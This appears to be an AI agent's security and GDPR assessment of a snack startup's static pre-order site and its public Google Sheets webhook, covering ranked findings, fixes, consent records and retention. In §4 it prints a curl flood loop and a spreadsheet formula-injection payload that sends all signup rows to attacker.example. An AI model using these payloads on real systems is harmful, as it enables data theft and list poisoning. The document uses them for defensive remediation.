# Zuca — Security & Privacy Assessment

**Scope:** `github.com/Zuca-Snacks/zuca-site` @ branch `sec/hardening`, cut from `main` (commit `4074263`).
**Assessed:** 2026-08-15 · **Assessor:** Agent 3 (appsec / privacy engineering)
**Status:** diagnosis complete; remediation in progress on this branch. Nothing merged to `main`.

> **Revision 2 — 2026-08-15.** The first pass scoped compliance to CCPA/CPRA and CAN-SPAM on the
> stated basis that Zuca is a California business with California users. **That was wrong.** The
> existing list of ~127 people is predominantly Norwegian and EEA — nearly every phone number is
> `+47`. Norway is in the EEA, so the **GDPR applies in full**, via Art 3(2)(a): we are a US
> controller offering goods to people in the Union, which brings us inside the Regulation regardless
> of where we sit.
>
> The GDPR is the stricter regime on every axis that matters here, and one consequence is not a
> matter of degree: **the outbound campaign as currently planned is prohibited, not merely
> risky.** See §5. Findings S5 and S13–S19 are new or rewritten, §6 (retention) is rebuilt around
> Art 5(1)(e), and the ranking in §3 has changed — two new Critical entries now sit above the
> original S3.
>
> *(Minor discrepancy worth checking: the live counter reads **136**, you said **127**. A nine-row
> gap in a list about to be emailed is worth reconciling before anyone sends anything.)*

> **Revision 3 — 2026-08-17.** Contract extended: quantity band, office-snack path, phone with SMS
> consent, postal address with its own opt-in, `*_other` free text per enum. Two new consequences
> for this document — **the blast radius of a list leak has changed materially (§4.1)**, and there
> is now a recommendation for the auto-response email (§10).

---

## 1. What this system actually is

Before the threat list, the architecture — because it is not what the brief assumed.

There is **no backend in this repository.** No `src/app/api/**`, no `server/**`, no `middleware.ts`,
no environment variables, no hosting config. The entire site is a single React component
([src/zuca-gate-v4.jsx](src/zuca-gate-v4.jsx), 1457 lines) compiled by Vite into a static bundle.

The "backend" is a **Google Apps Script web app** whose URL is hardcoded at
[src/zuca-gate-v4.jsx:5](src/zuca-gate-v4.jsx#L5) and called directly from the visitor's browser:

```
https://script.google.com/macros/s/AKfycbz…TFh/exec
```

That URL is simultaneously:

- the write endpoint (`POST` → appends a row to a Google Sheet),
- the read endpoint (`GET` → returns `{"count":136}`, the number rendered on the page),
- **the only credential protecting both**, and
- **published** — it is in the client JS bundle *and* in a **public GitHub repository**
  (`"visibility": "public"`, confirmed via the GitHub API).

A URL that grants write access and is required to be public cannot be a secret. This single
fact drives findings S1, S2 and S3.

## 2. Data flow

| Stage | Where | Who can read it |
|---|---|---|
| Collected | Pre-order modal, [src/zuca-gate-v4.jsx:1076-1151](src/zuca-gate-v4.jsx#L1076-L1151) | the visitor |
| In transit | `fetch(SHEETS_URL, {mode:"no-cors"})` over TLS to Google | Google |
| At rest (primary) | A Google Sheet in a Google Workspace account | anyone with the sheet share link + every Workspace admin |
| At rest (secondary) | **The visitor's own `localStorage`**, key `zuca_submissions_v1` — full record incl. name, email, phone, retained forever | the visitor, and any XSS on the origin |
| Egress | None to analytics (there is no analytics on the site at all — verified) | — |

**Fields actually collected** — `name`, `email`, `phone`, `hearAbout`, `reason`, `ts`.

Two of these matter disproportionately:

- **`phone`** is not in the frozen data contract in `AGENTS_BRIEF.md` at all, and is the most
  sensitive identifier on the form. It is also the field that revealed the jurisdiction problem:
  nearly every number is `+47`. If it is ever used for SMS, that needs prior consent under Norway's
  Marketing Control Act § 15 — and TCPA in the US. The current form captures no consent whatsoever.
- **`reason`** — options include *Gut health* and *Weight management* — reveals information about
  health. Under **GDPR Art 9(1)** that is a *special category of personal data*, and processing it
  is **prohibited outright** unless an Art 9(2) exception applies. The only one available to us is
  **Art 9(2)(a), explicit consent** — a higher bar than the ordinary consent covering the email
  address, requiring a separate, unbundled, affirmative act.
  **There is no consent checkbox anywhere on the form.** So this data is currently being collected
  unlawfully, not merely without best practice.

**Encryption at rest:** Google encrypts Drive/Sheets at rest by default (AES-256). Adequate.
**Console access:** unknown to me — see the owner-action list, item 6.

## 3. Ranked findings

Severity = impact × likelihood in *this* context (pre-launch consumer site, cold campaign imminent).
Exploitability = skill and access required. "Proof" = how I verified it, without touching production data.

| # | Severity | Finding | Exploitability | Blast radius | Status |
|---|---|---|---|---|---|
| **S1** | **Critical** | Public write endpoint with zero rate limiting, zero bot defense, zero auth | Trivial — one `curl` loop, no account, no skill | Pre-order list permanently poisoned; public traction counter falsifiable; sending domain blocklisted mid-campaign | Fixed on branch (see §4) |
| **S2** | **Critical** | Google Sheets **formula injection** via `name` / `hearAbout` / `reason` | Trivial — type a payload into "First name" | **Full exfiltration of every signup** (name, email, phone) to an attacker server when Emil opens the sheet | Fixed on branch + owner action |
| **S5** | **Critical** | **The outbound campaign is unlawful as planned.** Norway's Marketing Control Act § 15 prohibits marketing email to individuals without *prior* consent. CAN-SPAM's opt-out model does not exist in the EEA. | N/A — regulatory. Certain, not probable: it fires the moment you press send | Enforcement by Forbrukertilsynet; GDPR exposure in parallel up to €20M or 4% of turnover; the complaint most likely comes from a recipient | **Owner decision — see §5** |
| **S13** | **Critical** | **The existing ~127 records have no lawful basis.** Collected with no privacy notice, no consent checkbox, and no consent record. Under GDPR Art 7(1) consent that cannot be demonstrated did not happen. | N/A — regulatory | Retroactively unfixable. Constrains what you may lawfully do with the list you already have | **Owner decision — see §5** |
| **S3** | **High** | Write-capable webhook URL published in client bundle **and public GitHub repo** | Trivial — view-source, or read the repo | Same as S1; not fixable by secrecy — needs architecture change + URL rotation | Fixed on branch + owner action |
| **S4** | **High** | **No DMARC record. No DKIM record.** SPF is `~all` (softfail) | Trivial — anyone can spoof `@zucasnacks.com` | Cold campaign lands in spam; Zuca becomes a phishing vehicle against its own physician network | Owner action (DNS) |
| **S14** | **High** | Health-related `reason` field is **Art 9 special category data** processed with no explicit consent — prohibited by default, not merely unadvisable | N/A — regulatory | The highest-penalty category under GDPR. How many existing rows carry a `reason` value is unknown to me — check the sheet | Fixed on branch (enforced in code) + owner action |
| **S15** | **High** | No **GDPR Art 27 EEA representative** appointed. Required for a non-EEA controller targeting EEA data subjects; the Art 27(2) exemption does not apply because we process special category data | Trivially discoverable — its absence is visible from the privacy policy | An easy, obvious finding for any regulator or complainant who looks; signals the rest was not done either | Placeholder in policy + owner action |
| **S19** | **High** | No privacy policy, no terms, **no consent capture**, no deletion path | N/A — compliance | Art 13 information duty breached at every collection; CCPA/CPRA exposure; CAN-SPAM exposure (statutory max **$53,088 per email**) | Fixed on branch + owner action |
| **S6** | **High** | **Forbidden health claims are live on the site**, including in `<title>` and OG/Twitter meta | N/A — regulatory | FDA/FTC exposure on a food product; directly contradicts the brief's non-negotiable guardrails | **Not mine to fix** → `HANDOFF-sec.md` |
| **S7** | **Medium** | `mode:"no-cors"` ⇒ opaque response ⇒ **every submission reports success even when it fails** | N/A — reliability | Silent, unrecoverable loss of real signups; makes the contract's 409/429/500 responses impossible to implement | Fixed on branch |
| **S8** | **Medium** | Duplicate detection is `localStorage`-only; also persists the user's full PII in their browser indefinitely | Trivial — incognito window | Duplicate rows inflate the counter; unnecessary PII at rest on user devices | Fixed on branch |
| **S9** | **Medium** | **No security headers at all** — no CSP, HSTS, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, `frame-ancestors` | Low — clickjacking needs a lure | Pre-order modal can be framed and overlaid; no XSS containment | Fixed on branch |
| **S10** | **Medium** | Google Fonts loaded from CDN at runtime (`@import` at [src/zuca-gate-v4.jsx:111](src/zuca-gate-v4.jsx#L111)) | N/A — privacy | Every visitor's IP + User-Agent disclosed to Google, undisclosed in any policy; brief explicitly forbids this; also render-blocking | Flagged → `HANDOFF-sec.md` |
| **S16** | **Medium** | No **Art 30 record of processing**. The under-250-employee exemption is disapplied by Art 30(5) once special category data is processed | N/A — regulatory | First thing requested in any investigation | Owner action |
| **S17** | **Medium** | Indefinite retention. Art 5(1)(e) requires a stated, justified period; "until we feel like deleting it" is not one | N/A — regulatory | Storage-limitation breach; also enlarges the blast radius of S1–S3 | Fixed on branch (§6) |
| **S11** | **Low** | 9 npm advisories (7 high) — `vite`, `postcss`, `@babel/core`, `launch-editor` | Local only | **All are devDependencies**; none reach the production bundle. But three dev servers are running on Emil's laptop right now, and one advisory is dev-server arbitrary file read | Fixed on branch |
| **S12** | **Low** | No CAA record on `zucasnacks.com` | Low | Any CA in the world may issue a certificate for the domain | Owner action (DNS) |
| **S18** | **Low** | No signed **Art 28 processor agreements** on file for Google, Vercel, Upstash | N/A — regulatory | Controller-side breach even where the processor behaves perfectly | Owner action |

### Findings that are *not* problems (checked, clean)

- **No API keys, tokens, database URLs, private keys, or `.env` files** in the working tree or in
  any of the 20 commits of git history. I scanned every blob ever committed against AWS / Stripe /
  Slack / GitHub / Google API / SendGrid / Resend / JWT / connection-string / PEM patterns. Clean.
- **`.gitignore` already covers** `.env`, `.env.local`, `.env.*.local`.
- **No `VITE_`-prefixed or `import.meta.env` variables exist** — so nothing is leaking through the
  Vite public-env mechanism. The project uses no environment variables at all today.
- **The read path does not leak the list.** I issued one unauthenticated `GET` to the live webhook;
  it returns exactly `{"count":136}` and nothing else. There is no `?all=1`-style enumeration.
- **No analytics, no tag manager, no tracking pixel, no third-party script tags.** The only
  third-party network request the site makes is Google Fonts (S10). No PII leaves for analytics.
- **No `dangerouslySetInnerHTML`, no `eval`, no `innerHTML`** anywhere — the React tree escapes all
  user input, so there is no reflected/stored XSS in the site itself.

## 4. The three findings that matter most, in detail

Each is stated as **threat → exploit → fix → proof**, per the engagement rules.

### S1 — Anyone can write unlimited rows to the pre-order list

**Threat.** The endpoint that appends to the signup sheet is public, unauthenticated, unmetered and
unprotected by any bot check. There is no honeypot, no timing gate, no CAPTCHA, no rate limit — not
weak versions of these, but none at all.

**Exploit.** No skill required. The URL is in the page source:

```bash
for i in $(seq 1 10000); do
  curl -s -X POST "$SHEETS_URL" -H 'Content-Type: text/plain' \
    -d "{\"name\":\"bot$i\",\"email\":\"bot$i@mailinator.com\",\"ts\":\"$(date -Iseconds)\"}" &
done
```

**Blast radius — why this is Critical and not Medium.** Three compounding consequences:

1. **The list becomes unusable.** Once 10,000 junk rows sit alongside 136 real pre-orders, there is
   no reliable way to separate them. The asset is not damaged, it is destroyed.
2. **The traction number becomes a liability.** The site renders the live sheet count to visitors
   ("Join *N* others on the list"). That same number is the one quoted to investors. An attacker —
   or a bored competitor — controls it. A falsified traction figure shown to investors is a worse
   problem than a security incident.
3. **The campaign dies on arrival.** Feed a list padded with spamtraps and mailinator addresses into
   an ESP and `zucasnacks.com` gets blocklisted — precisely when the cold campaign launches, and
   precisely into the physician network that is Zuca's most valuable audience.

**Fix (this branch).** A real server-side endpoint at `POST /api/waitlist` (Vercel function) that
enforces: strict Zod validation with unknown keys rejected · POST-only · JSON-only · 8 KB body cap ·
honeypot · sub-2s submit rejection · per-IP limits (5/min, 20/hr) · a global endpoint ceiling ·
disposable/role-address filtering · `409` on duplicate. The Apps Script webhook stops being
browser-reachable and becomes a server-to-server call authenticated with a shared secret.

**Proof.** `scripts/attack-waitlist.mjs` — see §6.

### S2 — Formula injection exfiltrates the entire signup list

**Threat.** Submitted strings are written into Google Sheets cells verbatim. Google Sheets evaluates
any cell beginning `=`, `+`, `-`, or `@` as a formula. Sheets formulas can make outbound network
requests.

The code already knows this. [src/zuca-gate-v4.jsx:988](src/zuca-gate-v4.jsx#L988) prefixes phone
numbers with an apostrophe and comments *"Leading apostrophe forces Google Sheets to store as text,
not formula."* That guard was applied to the one field that cannot contain letters — and to none of
the three free-text fields that can.

**Exploit.** Type this into the **First name** box on the live site and submit:

```
=IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",A1:E500)),"//a")
```

No further attacker action. The next time Emil opens the sheet, Google's servers evaluate the
formula and issue a request carrying **the contents of 500 rows — every name, email and phone
number collected** — to the attacker's log. Variants using `IMAGE()` or `HYPERLINK()` work the same
way. The exfiltration comes from Google's IP range, leaves no trace in the sheet beyond one odd-
looking cell, and needs no compromise of any account.

**Blast radius.** This is the list-leak scenario from the engagement brief (threat #3), and it is
live right now. 136 real pre-orders, with phone numbers, plus health-adjacent `reason` values.

**Fix (this branch).** Two layers. Server-side, `sanitizeForSheet()` in
[src/lib/validation.js](src/lib/validation.js) neutralizes leading formula characters on every
string before it is forwarded. Sheet-side, the hardened Apps Script in
[server/apps-script/Code.gs](server/apps-script/Code.gs) re-applies the same guard and writes with
`setValues` on text-formatted columns — defence at both ends, because the Apps Script is the last
gate before the data lands.

**Proof.** §6, case 6.

### 4.1 The extension changes what a leak costs

Worth stating before the fixes, because it re-prices every finding above.

Until now the worst case for a list leak was: name, email, phone (legacy, ungated), and a
health-adjacent motivation. As of the 2026-08-17 extension the sheet can also hold **home postal
addresses**, **consent-gated phone numbers**, and **employer name and size**.

| | Before | After |
|---|---|---|
| Identify a person | email, sometimes a name | + home address, phone, employer |
| Reach them offline | no | **yes — post and SMS** |
| Infer something sensitive | health motivation | + health motivation *and* where they sleep |

That combination — name, home address, phone, and a statement about someone's digestive health, for
~137 mostly Norwegian people — is a materially different asset from an email list. It is the shape
of data that supports stalking and targeted fraud, not just spam. Under GDPR Art 34 a breach of it
would very likely require notifying **every affected individual**, not merely Datatilsynet.

Nothing about S1, S2 or S3 becomes newly exploitable. What changes is the cost when they land, and
therefore how much the owner actions in §9 are worth. **Items 3, 4 and 9 (rotate the webhook, audit
for formula payloads, lock down sheet sharing) were already the right call; they are now the
difference between an embarrassing leak and a reportable one.**

Two controls added with the extension, both structural rather than reactive:

- **Consent-gated storage.** Phone and address are written only behind their own opt-in. Someone who
  types an address and does not tick the box leaves nothing behind to leak. The cheapest data to
  protect is data you never stored.
- **A separate `sms_phone` column.** The existing `phone` column holds 137 legacy numbers captured
  with no consent at all. Writing consent-gated numbers into it would make the two distinguishable
  only by reading a neighbouring cell, and the failure mode of getting that wrong is texting
  somebody who never agreed to be texted.

### S3 — The write credential is published and cannot be un-published

**Threat.** The webhook URL is the only thing standing between the public and the sheet, and it must
be in the client bundle for the current architecture to work. It is additionally committed to a
public GitHub repo (commit `a0c52a8`, *"Add Sheets webhook"*).

**Exploit.** `view-source:`, or `git clone` the public repo. Then S1 and S2.

**Why rotation alone does not fix it.** Redeploying the Apps Script gives a new URL, which lands in
the next bundle, which is public again within one deploy. Secrecy is not available to a browser-
called endpoint. The architecture has to change: the browser must call *our* origin, and only our
server may hold the webhook URL.

**Fix (this branch).** The browser now calls same-origin `/api/waitlist`. The Apps Script URL moves
to `SHEETS_WEBHOOK_URL`, a server-only environment variable (deliberately **not** `VITE_`-prefixed —
that prefix is what makes a Vite variable public, and using it here would recreate the bug). The
Apps Script additionally requires a shared secret header, so even a leaked URL is not sufficient to
write.

**Proof.** `grep -r "script.google.com" dist/` after build returns nothing — §6, case 9.

## 5. GDPR — and why the campaign is the finding

### 5.1 Why the GDPR applies to a California company

Article 3(2)(a). The Regulation follows the data subject, not the company. A controller with no
establishment in the Union is still bound when it offers goods or services to people in the Union —
and a pre-order waitlist aimed at Norwegian consumers, priced for them and about to be emailed to
them, is exactly that. Norway is not an EU member but is in the **EEA**, which incorporates the
GDPR wholesale; the supervisory authority is **Datatilsynet**.

Two consequences follow immediately, and neither is a matter of degree:

1. The `reason` field is **Art 9 special category data**. Processing it is *prohibited* unless an
   Art 9(2) exception applies. Ours would be explicit consent, which we never obtained.
2. Email marketing to individuals in Norway requires **prior consent** under the Marketing Control
   Act (*markedsføringsloven*) § 15. This is national implementation of the ePrivacy Directive, it
   sits alongside the GDPR rather than inside it, and it is what actually makes the campaign
   unlawful.

### 5.2 What GDPR prohibits that CAN-SPAM allows

This was the specific question. The two regimes are not stricter and laxer versions of one idea —
they are **structurally opposite**. CAN-SPAM is an opt-*out* law: you may email anyone until they
tell you to stop. The EEA is opt-*in*: you may email nobody until they tell you to start. A campaign
designed against the first is not merely under-compliant with the second; it is inverted.

| Practice | CAN-SPAM (US) | EEA (GDPR + Marketing Control Act § 15) |
|---|---|---|
| **Cold email to someone who never asked for it** | **Legal.** The entire basis of the law, provided you honour opt-outs | **Prohibited.** Prior consent required. No exception for relevance, small volume, or good intentions |
| Buying, renting or scraping a list | Legal (harvesting is an aggravating factor; purchase is not) | Effectively impossible. Consent must have been given **to us, named**. Plus an Art 14 notice to every person within one month |
| Consent records | Not required | **Art 7(1):** you must be able to *demonstrate* consent. No record = no consent, whatever actually happened |
| Pre-ticked boxes | N/A — no consent needed | Invalid (*Planet49*, C-673/17) |
| Bundling consent into T&Cs | N/A | Invalid — must be freely given, specific and separable (Art 7(2), 7(4)) |
| 10 business days to process an unsubscribe | Legal | Withdrawal must be **as easy as giving** consent and act without undue delay |
| No privacy notice at the point of collection | Legal | **Art 13 breach at every single signup** |
| Keeping data indefinitely | Legal | **Art 5(1)(e) breach** — a stated, justified period is mandatory |
| Collecting extra fields "just in case" | Legal | **Art 5(1)(c)** data minimisation breach |
| Segmenting the list by health interest | Legal | **Art 9** — prohibited without *explicit* consent |
| A US company emailing EEA residents with no local presence | Legal | **Art 27** EEA representative required first |
| Emailing a named doctor at a clinic | Legal | That person is a natural person. § 15 applies. Prohibited without consent |

**The one exception, and why it does not rescue us.** Norway's § 15 has a "soft opt-in": prior
consent is not needed where the address was obtained *in the course of a sale* of similar goods, and
opt-out was offered both at collection and in every message since. **No sale has occurred.** The
form says explicitly *"No payment now."* Waitlist signups are not customers, so the exception does
not reach them.

### 5.3 The practical answer: the campaign splits by geography

The useful finding is not "stop" — it is that **the campaign was one thing and is actually two**:

- **US recipients — proceed.** The Vituity physician network (6,000+ doctors) is in the US.
  CAN-SPAM governs, cold outreach is lawful, and the existing plan is fine subject to the ordinary
  requirements: real postal address, working unsubscribe, honest subject lines. Nothing here blocks
  the launch you were planning.
- **EEA/Norwegian recipients — do not send the campaign.** Cold email to this cohort is prohibited
  regardless of how it is written. This is the part that has to change.

Segment the list by country before anything goes out. The `+47` phone prefix and the postal codes
give you most of it; email TLD (`.no`) and signup origin give you the rest.

### 5.4 The ~127 existing records

The harder problem, because it cannot be fixed forwards.

Those records were collected with no privacy notice, no consent checkbox, and no consent record. Art
7(1) puts the burden of proof on the controller, and the honest position is that **we cannot
demonstrate consent for a single one of them.** Nothing added to the site today changes that
retroactively.

Where it is genuinely arguable in our favour: these people were not scraped or bought. Each one
typed their address into a form headed *"Reserve your box"* and *"We'll reach out when your order is
ready to confirm."* That is an unambiguous affirmative action indicating agreement to be contacted
about this specific thing. What is missing is the **evidence** and the **Art 13 notice** — not
necessarily the underlying agreement.

That distinction matters, because it separates two very different actions:

| Action | Assessment |
|---|---|
| One email confined strictly to what they signed up for — *"pre-orders are open, here is your link"* — carrying the Art 13 notice and a link to the privacy policy | **Defensible.** It is the purpose they gave the address for, and nothing more |
| Treating the list as a general marketing list — newsletters, product news, drip sequences | **Not defensible.** Exceeds the purpose and has no demonstrable consent behind it |
| A "are you still interested? click to stay subscribed" re-permission blast | **Riskier than it looks.** Regulators have treated re-permission emails as marketing in their own right — the ICO fined Flybe and Honda for exactly this. Sending one to people you admit you have no consent for is an odd way to prove you had consent |

**Recommendation.** Segment by country. For the EEA cohort, send **one** message strictly scoped to
the original purpose, containing the Art 13 notice and a clear affirmative opt-in for anything
further; anyone who does not opt in receives nothing else and is deleted at the retention deadline.
Write down the reasoning *before* sending — Art 5(2) accountability means a contemporaneous record
of a considered decision is itself worth something if this is ever questioned. Then run the real
list from consent captured through the hardened form, where it is recorded properly.

**This is a legal judgement call, not an engineering one, and it is above my pay grade — send this
section to Cooley before anything is sent.** It is also the one item on this whole assessment where
getting it wrong is irreversible: you cannot un-send an email to 127 people.

### 5.5 Transfers to the US

The list lives in Google Sheets on US infrastructure, so every EEA record crosses a border and needs
a Chapter V basis. The position is better than it might have been:

| Processor | Status | Basis |
|---|---|---|
| **Google LLC** | DPF-certified | EU–US Data Privacy Framework adequacy decision, 10 July 2023 |
| **Vercel, Inc.** | DPF-certified | Same |
| **Upstash** | **Not on the DPF list** | See below |

The Commission's adequacy decision **expressly covers Norway, Iceland and Liechtenstein**, not only
EU member states — so Norwegian transfers to Google and Vercel need no additional safeguard. Verify
current status at [dataprivacyframework.gov/list](https://www.dataprivacyframework.gov/list); a
certification can lapse.

Upstash is the loose end, and there are two ways to close it. The clean one is to **create the
database in an EU region** (`eu-west-1` / `eu-central-1`), which removes the transfer question
entirely rather than papering it with a safeguard — the region is fixed at creation, so this must be
decided before provisioning. Now noted in `.env.example`.

I also changed the code in response to this. Upstash held a **plain SHA-256** of each email for
duplicate detection. A plain hash of an email address is not anonymous data: the set of real
addresses is small enough to enumerate with a wordlist, which under Recital 26 makes it
pseudonymised personal data — meaning the rate-limit store was a second copy of the mailing list,
subject to transfer rules and erasure requests. It is now a **keyed HMAC** using a server-held
pepper (`EMAIL_HASH_PEPPER`), which cannot be reversed without also stealing the key. Two-line
change, removes a processor from the scope of the list.

### 5.6 Art 27 EEA representative — do we need one before contacting EEA recipients?

Asked directly, so answered directly: **the obligation has already been triggered. It is not
pending on the campaign — it is currently unmet.**

Art 27 attaches to the *processing*, not to any outbound message. It applies where a controller
outside the Union offers goods or services to data subjects in the Union, and we crossed that line
the day a Norwegian typed their address into the pre-order form. The waitlist already holds EEA
personal data. Sending nothing at all would not cure it.

So the sequence is not "appoint one before emailing" — it is "appoint one, because we should
already have had one."

**The exemption does not reach us.** Art 27(2)(a) lets you skip it where processing is *occasional*,
**and** excludes large-scale special category data, **and** is unlikely to result in risk. Those are
cumulative, not alternatives. Ours is not occasional — it is a continuous, ongoing waitlist — and we
process Art 9 health data. Either failure alone disqualifies us.

**What it actually requires:**

- A designation **in writing** (a mandate letter), naming a representative established in a member
  state where the data subjects are. Norway is where ours are.
- The representative's **identity and contact details published in the privacy notice** —
  Art 13(1)(a). There is a marked placeholder waiting in `public/privacy.html`; the policy is
  incomplete until it is filled.
- The representative must be **addressable by both data subjects and Datatilsynet**, and must keep a
  copy of the Art 30 record.

**Cost and effort:** commercial services run roughly €200–500/year and onboard in days. Several are
Norway-based. This is one of the cheapest items on the entire list and one of the most visible when
absent — its absence is discoverable from the privacy policy alone, by anyone, without any
investigation. It is the finding that tells a regulator the rest was probably not done either.

**Note the representative is not a liability shield.** Art 27(5) is explicit: designating one does
not affect the controller's own liability. It provides a point of contact, not cover.

### 5.7 The list is global — five more regimes are in scope

The outreach list spans the US, Latin America, Asia and Europe. GDPR is therefore not the whole
picture, only the strictest part of it so far. **Naming these for Cooley rather than attempting to
resolve them** — each needs local counsel, and pretending otherwise would be worse than saying so.

| Regime | Territory | Why it bites us specifically |
|---|---|---|
| **LGPD** — Lei Geral de Proteção de Dados | Brazil | Closely modelled on GDPR: extraterritorial reach, consent-based lawful basis, data subject rights, and a **local representative requirement** mirroring Art 27. Health-related data is *dado sensível* with heightened conditions. Enforced by the ANPD |
| **LFPDPPP** | Mexico | Requires an *aviso de privacidad* with prescribed content, delivered **at the point of collection** — the notice itself is the regulated artefact, and a generic policy page may not satisfy it. Sensitive data requires **express written** consent, a higher bar than GDPR's explicit consent |
| **PDPA** | Singapore | Consent-based, with a statutory **Do Not Call registry** for phone numbers. Notable for us: **PDPA has criminal penalties for certain breaches**, and unsolicited commercial messaging has its own regime |
| **APPI** | Japan | Consent required for third-party transfer *and* for cross-border transfer, with prescribed disclosures about the recipient country. Health information is *sensitive personal information* requiring opt-in. The PPC enforces |
| **PIPA** | South Korea | Historically the strictest consent regime of the five. Requires **separate, itemised consent per purpose** — a single combined checkbox is not sufficient — plus specific rules for marketing consent, and it must be as easy to refuse as to accept. Fines are turnover-based |

**Three practical observations, since they change engineering rather than legal work:**

1. **Every one of these is opt-in.** Not one of the five follows CAN-SPAM's opt-out model. The
   geographic split in §5.3 is therefore not "US versus Europe" — it is **the US versus almost
   everywhere else**. The US is the outlier, and it is the only market where the current campaign
   design is lawful as written.
2. **Korea's itemised-consent rule and Mexico's notice-at-collection rule are the two most likely to
   require UI changes**, not just policy text. A single combined checkbox will not satisfy PIPA.
3. **The `country` field added in this amendment is what makes any of this tractable.** Without a
   per-record regime marker, the only compliant option for a global list is to apply the strictest
   rule to everyone. With it, the list can be segmented and each cohort handled correctly — which is
   the difference between a campaign that runs and one that cannot.

The consent receipt records `regime: "eea" | "other"`, which is enough for the EEA/non-EEA split
that matters today. If Cooley confirms LGPD/PIPA/APPI need distinct handling, that field is where
the finer classification belongs, and extending it is a small change.

## 6. Retention and deletion

Written to be executable, not aspirational. Revised for GDPR: Art 5(1)(e) requires a **stated,
justified** period, so each row below carries its reason. "Until we get round to it" is not a
retention policy, and an unjustified period is the same finding as no period at all.

### Retention schedule

| Data | Period | Justification |
|---|---|---|
| Waitlist record | **24 months** from last interaction, or on request | A food product runs pre-order to shelf over one to two years. Past that, consent is stale and the record serves nobody |
| `motivation` (Art 9 health data) | **12 months**, or on withdrawal of that specific consent | Deliberately shorter than everything else: most sensitive, least necessary |
| Consent record | Lifetime of the waitlist record **+ 12 months** | It is the evidence the processing was lawful, so it has to outlive what it justifies |
| Server logs | **30 days** | Enough to investigate a fault or an attack. No addresses — keyed handles only |
| Unsubscribe suppression list | **Indefinite** — keyed HMAC only | The one deliberate exception, and it is justified by Art 17(3): deleting it would defeat the objection it exists to honour |
| Product abandoned | Everything within **90 days** | The purpose consented to would no longer exist |
| Hard-bounced twice | **30 days** | Protects sender reputation as well as the subscriber |

### Deletion procedure

**Deadline: one month** (GDPR Art 12(3)), extendable by two further months for genuinely complex
requests with notice inside the first month. This is shorter than CCPA's 45 days, so it governs for
everyone — running two clocks is how one gets missed.

1. Request arrives at `privacy@zucasnacks.com` (owner action — this mailbox must exist).
2. Verify the requester controls the address: reply from the Zuca mailbox and require a reply.
   **Do not request an ID document, an account, or anything not already held.** Both CPRA and GDPR
   Art 12(2) prohibit collecting new personal data to service a rights request, and Art 11 bars
   demanding extra identification purely to enable identification.
3. In the sheet: find the address → delete the **entire row**, not just the email cell.
4. In the ESP, once one exists: delete the contact, then add the address to the suppression list.
   Suppression retains a keyed HMAC only.
5. Log it in a separate `dsr_log` sheet: date received, date completed, action, request type. **No
   email address in the log** — record the keyed handle. You must be able to demonstrate compliance;
   you must not keep the data you deleted in order to prove you deleted it.
6. Reply confirming completion. **Free of charge** — Art 12(5) permits a fee only for manifestly
   unfounded or excessive requests, which in practice means never for a list this size.

### Demonstrating consent for a specific person

The contract amendment adds `consent_text_version`, `consent_timestamp` and `country`, all set
server-side. Alongside them the endpoint writes **`consent_receipt`** — a single JSON cell that is
the complete answer for one person:

```json
{
  "schema": "zuca.consent.v2",
  "marketing": {
    "granted": true,
    "version": "mkt-eea-2026-08.a",
    "text": "Email me when pre-orders open. You can unsubscribe any time.",
    "registry_match": true
  },
  "health": {
    "granted": true,
    "version": "health-eea-2026-08.a",
    "text": "Store my reason for interest so you can tailor what you send me.",
    "registry_match": true
  },
  "timestamp": "2026-08-15T12:04:31.118Z",
  "country": "NO",
  "regime": "eea",
  "reconciliation": {
    "needs_reconsent": false,
    "reason": null,
    "status": "ok",
    "marketing_regime": "eea",
    "health_regime": "eea"
  },
  "ip_prefix": "203.0.113.0",
  "user_agent": "Mozilla/5.0 …",
  "method": "web_form",
  "…": "~710 bytes; column cap 4000"
}
```

**The two consents are recorded symmetrically and independently**, each with its own identifier,
its own resolved wording and its own registry-match flag. That symmetry is the point: the legal
basis for holding `motivation` at all is that its consent was *separate and unbundled* from the
marketing consent, and a record that cannot show two distinct acts does not evidence that.

> **A defect this caught.** The v1 receipt embedded a **hardcoded** health wording — a literal
> lookup of one fixed id — and recorded no health version whatsoever. A change to that line of copy
> would have attached the *old* text to every *new* record: evidence that is confidently wrong,
> which is materially worse than evidence that is missing, because nothing about it looks broken.
> Found by checking the claim rather than re-reading the summary of it.

**To answer "prove this person consented":** find their row, copy the `consent_receipt` cell. That
is the whole procedure. It states what they were shown, in the words they read, when, from which
country, under which regime, and by what method.

Two deliberate design choices behind it:

- **It embeds the verbatim wording, not just the version id.** An identifier is only evidence while
  something can still resolve it, and the code that resolves it will have changed many times over a
  retention period. `2026-08-15.marketing.a` will mean nothing in eighteen months; the sentence the
  person actually read will mean exactly what it meant.
- **The cell length cap is raised to 4000 for this column specifically.** The default is 500, and a
  receipt runs ~550. Truncated JSON is not shortened JSON — it is unparseable, which would break the
  one artefact meant to prove consent at precisely the moment someone needed to read it. There is a
  test asserting it round-trips.

### Regime reconciliation — the records that look fine and are not

A signup can be complete, internally consistent and still worthless as evidence: someone in Oslo
served the **US** consent copy — because of a VPN, travel, a CDN edge decision, or a bundle cached
before the geo split shipped — ticks the box and is recorded as having consented under wording never
written to meet GDPR. Nothing errors. No field is missing. It would fail an audit *precisely
because* it looks fine, which is why nobody would ever go looking for it.

At any real volume that set is not empty. So it is computed on write and promoted to its own
columns, `needs_reconsent` and `reconsent_reason`, rather than left inside the receipt JSON — a flag
buried in a string is a flag nobody filters on.

The regime of a wording is read from its identifier, tokenised on `. _ -`, with an explicit `regime`
in the registry overriding the parse. Canonical tokens are **`eea`** and **`us`**; `eu`, `gdpr`,
`uk`, `usa` and `canspam` are accepted synonyms, because a vocabulary that only works if you guess
the right spelling is a vocabulary that fails silently. Tokenised rather than substring-matched: a
naive `/us/` test classifies `2026-08-15.august.a` as US-targeted, and a wrong regime here produces
a wrong re-consent decision.

**Three outcomes, in `consent_regime_status`:**

| Status | Condition | Meaning |
|---|---|---|
| `ok` | Regimes agree, or the wording is registered `global` | Nothing to do |
| `mismatch` | EEA visitor, US-tagged wording | Definite problem — re-consent |
| `unverifiable` | EEA visitor, **untagged** wording | We cannot say what regime the wording targeted |

`unverifiable` was added after being asked what happens to an unknown regime today. The answer was
**nothing — it fell straight through as unflagged**, and that was the wrong default in the worst
possible place: Art 7(1) asks us to *demonstrate* consent, "we cannot tell" is not a demonstration,
and untagged is the default state of every newly minted identifier. So the weakest evidence state
was producing the cleanest-looking row, in the case most likely to occur. Both statuses now set
